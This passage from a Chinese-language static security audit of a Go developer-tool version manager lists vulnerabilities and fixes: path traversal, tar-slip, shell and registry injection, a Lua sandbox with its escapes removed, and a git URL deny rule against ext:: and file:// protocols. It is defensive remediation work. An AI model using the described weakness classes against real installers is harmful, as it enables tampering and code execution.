- **文件**: `internal/cli/install.go:172-208`
- **问题**: 两个 `xdev use` 同时运行，junction 和环境变量可能不一致
- **修复**: 使用命名互斥体（Windows Mutex）保护版本切换操作

```go
// 使用 Windows 命名互斥体
func acquireInstallLock(tool string) (func(), error) {
    name := fmt.Sprintf("Global\\xdev_install_%s", tool)
    // ... CreateMutexW ...
}
```

---

## 5. LOW 级别漏洞

| ID | 文件 | 问题 | 修复建议 | 状态 |
|----|------|------|----------|------|
| L-1 | `config.go:258-265` | 原子写入在 Windows 上跨卷不安全 | 确保同一卷操作 | ✅ 已修复 |
| L-2 | `config.go:522-536` | UpdateConfigPaths 原始字符串替换 | 改为结构化 YAML 操作 | ✅ 已修复 |
| L-3 | `config.go:376-402` | `last_selection.json` 可被篡改 | 添加完整性校验 | ✅ 已修复 |
| L-4 | `lockfile.go:92-107` | `.tmp` 文件在崩溃后残留 | 启动时清理残留 `.tmp` | ✅ 已修复 |
| L-5 | `shim.go:187-284` | Shim index 竞态（性能问题） | 使用 `sync.Once` 构建 | ✅ 已修复 |
| L-6 | `manager.go:89-120` | Service 发现 TOCTOU | 可接受，文档记录 | ✅ 已修复（5秒缓存） |
| L-7 | `manager.go:246-254` | 服务日志无限增长 | 添加日志轮转 | ✅ 已修复 |
| L-8 | `audit.go:44-77` | 审计日志无限增长 | 添加大小限制/轮转 | ✅ 已修复 |
| L-9 | `log.go:48-75` | GUI 日志截断而非轮转 | 实现真正的日志轮转 | ✅ 已修复 |
| L-10 | `downloader.go:322-339` | Sidecar 哈希文件自信任模型 | 配合签名使用 | ✅ 已修复（TOFU+签名优先） |
| L-11 | `installer.go:391-432` | Junction 创建中途崩溃 | 添加恢复机制 | ✅ 已修复（回滚） |
| L-12 | `win_path_windows.go:802-824` | WM_SETTINGCHANGE 静默失败 | 提示用户重启终端 | ✅ 已修复 |

---

## 6. 安全加固建议总览

### 6.1 路径安全（最高优先级）

| 措施 | 影响的漏洞 | 复杂度 |
|------|-----------|--------|
| 创建 `util.SafeName()` / `util.ValidateSubPath()` | C-1, C-2, C-3, M-9 | 中 |
| 在所有 `InstallDir` 中校验路径 | C-1, C-2, C-3 | 中 |
| 在 `loadLuaBase` 中校验插件名 | C-2 | 低 |
| 在 `AddCustomTool` 中校验名称 | C-3 | 低 |
| 修复 7z 解压为前置校验或沙箱 | C-6 | 中 |
| 修复 tar 跨条目符号链接 | H-1 | 中 |
| Service marker 中 EvalSymlinks | H-2 | 低 |
| isSafePath Windows 硬化 | M-8 | 低 |

### 6.2 完整性验证（最高优先级）

| 措施 | 影响的漏洞 | 复杂度 |
|------|-----------|--------|
| 生成真实 Ed25519 密钥对 | C-5 | 中 |
| 为所有 manifest 补充 SHA-256 | C-4 | 高（工作量） |
| 强制 HTTPS 下载 | H-7 | 低 |
| 禁止 HTTPS→HTTP 重定向 | H-8 | 低 |
| 自更新强制哈希校验 | H-11 | 低 |
| 锁文件 HMAC 校验 | H-13 | 中 |

### 6.3 注入防护（高优先级）

| 措施 | 影响的漏洞 | 复杂度 |
|------|-----------|--------|
| Fish shell PATH 引用 | H-5 | 低 |
| 环境变量键名校验 | H-6 | 低 |
| Task runner 确认机制 | C-7 | 中 |
| Lua 沙箱移除 dofile/loadfile | H-3 | 低 |
| Lua 插件 URL 校验 | H-4 | 低 |
| GUI 环境变量白名单 | H-14 | 低 |

### 6.4 状态一致性（中优先级）

| 措施 | 影响的漏洞 | 复杂度 |
|------|-----------|--------|
| Activate 回滚机制 | H-9, H-10 | 高 |
| Uninstall 清理环境变量 | M-1 | 中 |
| PATH 长度限制 | M-2 | 低 |
| Lockfile 文件锁 | M-5 | 中 |
| 版本切换命名互斥体 | M-16 | 中 |

### 6.5 拒绝服务防护（中优先级）

| 措施 | 影响的漏洞 | 复杂度 |
|------|-----------|--------|
| Lua 执行超时+内存限制 | M-12 | 中 |
| 归档总大小限制 | M-11 | 低 |
| 日志轮转 | L-7, L-8, L-9 | 低 |

---

## 7. 修复优先级路线图

### 阶段 1：紧急修复（1-2 天） ✅ 已完成

**目标**：阻断最高风险的攻击路径

1. **创建 `util.SafeName()` 和 `util.ValidateSubPath()`** ✅ — 阻断所有路径穿越
2. **在 `InstallDir`（Generic/Lua/Custom）中添加路径校验** ✅ — 阻断任意目录写入/删除
3. **Fish shell PATH 引用 + 环境变量键名校验** ✅ — 阻断 shell 注入
4. **GUI 环境变量白名单检查** ✅ — 阻断注册表任意写入
5. **强制 HTTPS 下载 + 禁止降级重定向** ✅ — 阻断 MITM

### 阶段 2：高优先级修复（3-5 天） ✅ 已完成

**目标**：完整的核心安全机制

1. **修复 7z 解压为前置校验** ✅ — 阻断文件逃逸
2. **修复 tar 跨条目符号链接** ✅ — 阻断 tar-slip 变种
3. **Lua 沙箱硬化**（移除 dofile/loadfile，冻结 package.loaders）✅
4. **Lua 插件输出校验**（URL scheme, env var 值）✅
5. **Service marker EvalSymlinks** ✅
6. **Task runner 首次确认机制** ✅
7. **PATH 长度限制检查** ✅

### 阶段 3：完整性保障（1-2 周） ✅ 已完成

**目标**：建立完整的信任链

1. **生成 Ed25519 密钥对，嵌入真实公钥** ✅ — `cmd/xdev-keygen/main.go` + `rootPublicKeyB64` ldflags 注入
2. **CI/CD 中自动签名 manifest** — 签名流程自动化（需 CI/CD 配合）
3. **为所有 manifest 补充真实 SHA-256 哈希** — 完整性保障（C-4 仍需逐个补全）
4. **锁文件 HMAC 校验** ✅ — `lockfile.go` 添加 HMAC 字段 + 机器特定密钥
5. **自更新强制哈希校验** ✅ — 阶段2已完成
6. **Config 完整性校验** ✅ — `config.go` 添加 Integrity HMAC 字段
7. **机器特定 HMAC 密钥** ✅ — `internal/util/hmac_key.go` (SHA-256 of username+hostname+SID)

### 阶段 4：状态一致性（1-2 周） ✅ 已完成

**目标**：确保操作原子性和一致性

1. **Activate 回滚机制** ✅ — `installer.go` 保存旧 junction 目标，失败时恢复
2. **setUserEnvVars 事务性写入** ✅ — 保存原始值，部分失败时回滚
3. **Uninstall 环境变量清理** ✅ — `removeUserEnvVars()` + `DeleteUserEnvVar()`
4. **Lockfile 文件锁** ✅ — `internal/util/filelock.go` (Windows: LockFileEx, Unix: flock)
5. **版本切换命名互斥体** ✅ — `internal/util/mutex.go` (Windows: CreateMutexW, Unix: file locks)
6. **PATH 长度限制** ✅ — `WriteUserPath()` 添加 32,767 字符限制
7. **SetUserEnvVar 值校验** ✅ — null byte 拒绝 + %VAR% 引用验证

### 阶段 5：安全硬化（持续） ✅ 大部分已完成

**目标**：防御深度和长期维护

1. **Lua 执行超时** ✅ — `vfox_compat.go` goroutine + channel + time.After
2. **归档总大小限制** ✅ — `extractor.go` 10 GiB 累计限制
3. **isSafePath Windows 特殊路径处理** ✅ — UNC/ADS/保留名/跨卷/尾随点号
4. **日志轮转** ✅ — `internal/util/logrotate.go` + 集成到 audit.go/manager.go
5. **Config 完整性校验** ✅ — 阶段3已完成
6. **Shim 子进程环境变量注入** ✅ — `env.EnrichFromRegistry()` 从注册表注入白名单变量
7. **Service 发现缓存** ✅ — `manager.go` 5秒 TTL 缓存避免重复扫描
8. **Lockfile .tmp 残留清理** ✅ — `Load()` 时清理
9. **Shim index sync.Once** ✅ — 避免竞态
10. **git clone URL 校验** ✅ — 拒绝 ext::/ssh:///file:// 协议
11. **下载 .part TOCTOU 修复** ✅ — O_EXCL + f.Stat 替代 os.Stat

---

## 8. 已实施修复摘要（阶段1-5）

以下修复已于 2026-07-04 实施并通过编译验证：

### 新增文件

| 文件 | 说明 |
|------|------|
| `internal/util/sanitize.go` | 安全工具函数：`SafeName()`, `ValidateSubPath()`, `IsValidEnvVarName()`, `IsAllowedEnvVarName()`, `AllowedEnvVarNames` |
| `manifests/placeholder.yaml.sig` | `go:embed` 占位签名文件，确保编译通过 |
| `internal/util/hmac_key.go` | 机器特定 HMAC 密钥派生（SHA-256 of username+hostname+SID） |
| `cmd/xdev-keygen/main.go` | Ed25519 密钥对生成 CLI 工具 |
| `internal/util/filelock.go` | 跨平台文件锁（平台无关部分） |
| `internal/util/filelock_windows.go` | Windows 文件锁实现（LockFileEx/UnlockFileEx） |
| `internal/util/filelock_unix.go` | Unix 文件锁实现（flock） |
| `internal/util/mutex.go` | 跨进程工具互斥体（平台无关部分） |
| `internal/util/mutex_windows.go` | Windows 命名互斥体实现（CreateMutexW） |
| `internal/util/mutex_unix.go` | Unix 进程互斥体实现（文件锁） |
| `internal/util/logrotate.go` | 基于大小的日志轮转 |

### 修改文件

| 文件 | 修复项 | 说明 |
|------|--------|------|
| `internal/plugin/generic.go` | C-1 | `InstallDir` 校验 Name/Version/InstallRoot/最终路径 |
| `internal/plugin/lua_plugin.go` | C-2 | `InstallDir` 校验 name/version/最终路径 |
| `internal/plugin/vfox_compat.go` | C-2, H-4, M-12 | `loadLuaBase` 校验插件名；`callArchive` 强制 HTTPS；`callEnvVars` 白名单过滤；Lua 执行超时 |
| `internal/gui/app_custom_tools.go` | C-3 | `AddCustomTool`/`InstallCustomTool` 校验 Name/Version |
| `internal/extractor/extractor.go` | C-6, H-1, M-8, M-11 | `extract7z` 预校验归档路径；`extractTarFromReader` 检查 symlink 祖先；Windows 特殊路径保护；10 GiB 总大小限制 |
| `internal/service/manager.go` | H-2, L-6, L-7 | `parseServiceMarker` EvalSymlinks；5秒发现缓存；日志轮转集成 |
| `internal/plugin/lua_engine.go` | H-3, M-3 | 覆盖 dofile/loadfile；冻结 package.loaders；RegistryMaxSize/CallStackSize 限制 |
| `internal/env/hook.go` | H-5, H-6 | Fish PATH 单条引用；环境变量键名 `IsValidEnvVarName()` 校验 |
| `internal/downloader/downloader.go` | H-7, H-8, M-6, C-4, L-10 | URL 强制 HTTPS；CheckRedirect 阻止降级；TOCTOU 修复（O_EXCL + f.Stat）；Sidecar TOFU 加固（只读+签名优先+stderr 警告） |
| `internal/mirror/mirror.go` | H-7 | `rewrite()` 强制使用 `https://` scheme |
| `internal/update/update.go` | H-11 | `verifySHA256` 缺少 SHA256SUMS/下载失败/找不到条目时返回错误 |
| `internal/gui/app_env_vars.go` | H-14 | `SetEnvVar` 添加 `IsAllowedEnvVarName()` 白名单检查 |
| `internal/env/win_path_windows.go` | H-14, M-1, M-2, M-4, M-14, L-12 | 白名单集中化；DeleteUserEnvVar/GetUserEnvVar；PATH 32,767 字符限制；null byte 拒绝+%VAR%验证；EnrichFromRegistry()；BroadcastEnvironmentChange 返回值检查+stderr 警告 |
| `internal/env/win_path_other.go` | M-14 | EnrichFromRegistry() no-op stub |
| `internal/cli/manifest_cmd.go` | M-9, M-13 | `SafeName()` 校验；git clone URL 协议白名单 |
| `internal/lockfile/lockfile.go` | C-7, H-13, M-5, L-4 | ConfirmedTasks；HMAC 字段+校验；文件锁；.tmp 残留清理 |
| `internal/task/task.go` | C-7 | `confirmTask()` 首次执行确认机制，SHA-256 命令哈希 |
| `internal/signer/verify.go` | C-5 | `rootPublicKeyB64` 改为空字符串，支持 ldflags 注入 |
| `internal/config/config.go` | H-12, L-1, L-2, L-3 | Integrity HMAC 字段+校验；mirror HTTPS 验证；原子写入；resolveXMDevDir last_selection.json HMAC 校验+迁移写入 |
| `internal/installer/installer.go` | H-9, H-10, M-1 | Activate 回滚机制；setUserEnvVars 事务性写入+回滚；removeUserEnvVars() |
| `internal/shim/shim.go` | M-14, L-5 | EnrichFromRegistry() 环境变量注入；sync.Once shim index |
| `internal/downloader/audit.go` | L-8 | 日志轮转集成 |
| `internal/gui/app_migration.go` | L-3 | LastSelection HMAC 字段+computeLastSelectionHMAC()；GetLastSelection/SaveLastSelection 完整性校验 |
| `internal/cli/install.go` | L-12 | newUseCmd/newUninstallCmd 添加 "open new terminal" 提示 |
| `manifests/dart.yaml` | C-4 | Linux x86_64: format tar.gz→zip, URL .tar.gz→.zip |
| `manifests/deno.yaml` | C-4 | Linux x86_64: format tar.gz→zip, URL .tar.gz→.zip |
| `manifests/haskell.yaml` | C-4 | Linux x86_64: URL x86_64-unknown-linux→x86_64-deb12/deb11-linux, mirror_url 清空 |
| `manifests/python.yaml` | C-4 | 3.11.10/3.10.15: release tag 20240907→20240909, release date 更新 |
| `main.go` | 2.6 | `go:embed manifests/*.yaml.sig` + `signer.SetEmbeddedSignaturesFS()` |
| `main_bindings.go` | 2.6 | 同 main.go |

### C-4 哈希补全进展

**自动化流水线工具**：`toolsHashFullCheck/` — 下载归档、计算 SHA-256、写入 manifest、清理下载文件

| 指标 | 数值 |
|------|------|
| Manifest 文件总数 | 38 (含 index.yaml / java.yaml 无 sha256) |
| sha256 条目总数 | 277 |
| 已填充真实哈希 | 271 (98%) |
| 全零占位符 | 6 (2%) |

**已填充的工具**（零全零条目）：
android-build-tools, android-cmdline-tools, android-emulator, android-ndk, android-platform-tools, android-platform, bun, cmake, dart, deno, dotnet, erlang, flutter, git, go, gradle, haskell, julia, kotlin, llvm, lua, make, mingw, maven, ninja, node, perl, ruby, rust, sbt, scala, typescript, uv, zig

**全部全零**（需替代下载源）：
| 工具 | 全零条目 | 可用替代源 |
|------|----------|-----------|
| php | 6 | php.net/windows.php.net 当前网络不可达（见下方说明） |

**已修复的 URL 错误**：
- `python.yaml`：3.11.10/3.10.15 的 release tag 从 `20240907`（404）修正为 `20240909`
- `dart.yaml`：Linux x86_64 格式从 `tar.gz`（404）修正为 `zip`
- `deno.yaml`：Linux x86_64 格式从 `tar.gz`（404）修正为 `zip`
- `haskell.yaml`：Linux x86_64 URL 命名从 `x86_64-unknown-linux`（404）修正为 `x86_64-deb12-linux`/`x86_64-deb11-linux`
- `maven.yaml`：mirror_url 从 aliyun（404）更新为 `repo.huaweicloud.com`（华为镜像可达）

**哈希获取策略验证结果**：
| 策略 | 工具 | 结果 |
|------|------|------|
| 官方 API 提取 SHA-256（零下载） | zig | ✅ `ziglang.org/download/index.json` 含所有版本 SHA-256 |
| GitHub API .sha256 校验文件（零下载） | python | ✅ `api.github.com` 下载 .sha256 校验文件获取哈希 |
| 华为镜像下载 + 本地计算 | maven | ✅ `repo.huaweicloud.com/apache/maven` 可达（需设 User-Agent） |
| npmmirror CDN 下载 + 本地计算 | typescript | ✅ `cdn.npmmirror.com` 可达 |
| 官方 SHA256SUMS 校验文件（零下载） | haskell | ✅ `downloads.haskell.org/~ghc/<版本>/SHA256SUMS` 直接可达 |
| Google Storage .sha256sum 侧车文件（零下载） | dart | ✅ `storage.googleapis.com/dart-archive/.../.sha256sum` 可达 |
| GitHub Release .sha256 侧车文件（零下载） | sbt | ✅ `github.com/sbt/sbt/releases/.../.sha256` 可达 |
| GitHub Release sha256sum.txt 聚合文件（零下载） | scala 3.x | ✅ `github.com/scala/scala3/releases/download/3.5.2/sha256sum.txt` |
| GitHub Release .sha256 侧车文件（零下载） | uv | ✅ `github.com/astral-sh/uv/releases/.../.sha256` 可达 |
| GitHub 直连下载 + 本地计算 | deno, scala 2.x | ✅ GitHub 网络稳定后可下载/计算 |
| php.net / windows.php.net | php | ❌ 当前网络不可达（192.169.120.162 timeout），所有国内/国际镜像最终重定向回 CDN 总站 |

**重试命令**（网络稳定后）：
```bash
cd toolsHashFullCheck
go run . -reset-failed   # 重置失败条目
go run . -workers 4       # 重新下载计算哈希
go run . -finalize        # 写入 manifest 并清理
```

### 未修复项（需后续跟进）

| 未修复项 | 所属阶段 | 原因 |
|--------|----------|------|
| C-4: 6个全零哈希补全（php.yaml） | 3 | php.net/windows.php.net CDN 总站不可达（192.169.120.162 timeout），所有镜像重定向回总站 |
| C-4: Sidecar TOFU 加固 | 3 | ✅ 已完成（签名优先+只读+stderr警告） |

#### C-4 剩余 6 项 php.yaml 全零哈希说明

`manifests/php.yaml` 中 6 个全零条目（3版本 × windows/amd64 + linux/x86_64）由 `php.net` / `windows.php.net` 当前网络不可达导致。已测试的镜像及结果：

| 镜像源 | 测试结果 | 详情 |
|--------|----------|------|
| 华为 `repo.huaweicloud.com/php/` | ❌ | 301 重定向至 `mirrors.huaweicloud.com` 门户 HTML 页面（非二进制） |
| 阿里 `mirrors.aliyun.com/php/` | ❌ | 404 — 阿里无独立 php 镜像 |
| 清华 `mirrors.tuna.tsinghua.edu.cn/php/` | ❌ | 404 — TUNA 无独立 php 镜像 |
| 中科大 `mirrors.ustc.edu.cn/php/` | ❌ | 403 — USTC 禁止访问 |
| 腾讯云 `mirrors.cloud.tencent.com/php/` | ❌ | 404 |
| `museum.php.net` | ❌ | 连接超时 |
| `nl1.php.net` / `de2.php.net` / `fr2.php.net` | ❌ | 301 → www.php.net（总站可达性测试失败） |
| `museum.php.net` | ❌ | HTTP 连接超时 |

php.net 系列域名（www.php.net / windows.php.net）DNS 解析均为 `*.b-cdn.net`（192.169.120.162），该 CDN IP 在当前网络环境下完全不可达（HTTPS 连接超时）。

**旁证**：`docker-library/php` GitHub 仓库的 `versions.json` 存有 PHP 官方 SHA-256（但仅记录 `.tar.xz` 格式，不记录 `.tar.gz` 也不记录 Windows zip）。因此即便通过 gh-proxy 代理能取到 Linux 的 SHA-256，也与 manifest 中的 `.tar.gz` 对不上号；Windows zip 的哈希则完全没有第三方镜像记录。

**推荐后续动作**：待 php.net CDN 总站可达时，使用 `toolsHashFullCheck` 自动化补全：
```bash
cd toolsHashFullCheck
go run . -reset-failed   # 重置 php 的 6 个失败条目
go run . -workers 2      # 重新下载并计算
go run . -finalize       # 写入 manifest 并清理
```

---

> **声明**：本审计基于静态代码分析，未进行动态渗透测试。部分漏洞的利用可能需要特定条件（如本地访问、第三方manifest安装等）。建议在实施修复后进行专项安全测试验证。
